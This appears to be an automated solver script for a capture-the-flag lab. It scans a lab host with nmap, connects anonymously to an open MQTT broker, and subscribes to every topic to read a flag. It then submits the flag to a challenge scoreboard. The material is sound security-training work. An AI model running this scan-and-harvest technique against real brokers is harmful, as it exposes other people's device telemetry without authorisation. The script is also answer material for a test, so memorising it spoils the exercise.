#!/bin/sh
set -eu

HOST=172.20.0.147
SCAN_FILE=/tmp/scl-challenge-frame-6b06f6-scan
nmap -Pn -p- --open -oG "$SCAN_FILE" "$HOST" >/dev/null

# A harmless HTTP probe shows that an open port can answer with an unrelated service.
printf 'GET / HTTP/1.0\r\n\r\n' | ncat -w 2 "$HOST" 1883 >/dev/null 2>&1 || true

FLAG=$(python3 - "$HOST" "$SCAN_FILE" <<'PY'
import socket
import sys

host, scan_file = sys.argv[1:]
ports = []
with open(scan_file, encoding="utf-8") as scan:
    for line in scan:
        if "Ports:" not in line:
            continue
        section = line.split("Ports:", 1)[1].split("Ignored State:", 1)[0]
        for item in section.split(","):
            fields = item.strip().split("/")
            if len(fields) >= 2 and fields[1] == "open":
                ports.append(int(fields[0]))


def enc_remaining(length):
    out = bytearray()
    while True:
        digit = length % 128
        length //= 128
        if length:
            digit |= 128
        out.append(digit)
        if not length:
            return bytes(out)


def packet(header, body):
    return bytes([header]) + enc_remaining(len(body)) + body


def read_packet(sock):
    first = sock.recv(1)
    if not first:
        raise RuntimeError("connection closed")
    multiplier = 1
    length = 0
    for _ in range(4):
        raw = sock.recv(1)
        if not raw:
            raise RuntimeError("incomplete packet")
        digit = raw[0]
        length += (digit & 127) * multiplier
        if digit < 128:
            break
        multiplier *= 128
    else:
        raise RuntimeError("invalid packet length")
    data = bytearray()
    while len(data) < length:
        part = sock.recv(length - len(data))
        if not part:
            raise RuntimeError("incomplete packet body")
        data.extend(part)
    return first[0], bytes(data)


def mqtt_string(value):
    data = value.encode()
    return len(data).to_bytes(2, "big") + data

for port in ports:
    try:
        with socket.create_connection((host, port), timeout=2) as sock:
            sock.settimeout(3)
            connect_body = b"\x00\x04MQTT\x04\x02\x00\x3c" + mqtt_string("scl-auto")
            sock.sendall(packet(0x10, connect_body))
            kind, body = read_packet(sock)
            if kind != 0x20 or body != b"\x00\x00":
                continue
            subscribe_body = b"\x00\x01" + mqtt_string("#") + b"\x00"
            sock.sendall(packet(0x82, subscribe_body))
            for _ in range(4):
                kind, body = read_packet(sock)
                if kind >> 4 == 3:
                    topic_length = int.from_bytes(body[:2], "big")
                    value = body[2 + topic_length:].decode()
                    if value:
                        print(value)
                        sys.exit(0)
    except (OSError, RuntimeError, UnicodeError):
        continue
sys.exit("No MQTT telemetry record found")
PY
)

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-6b06f6\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
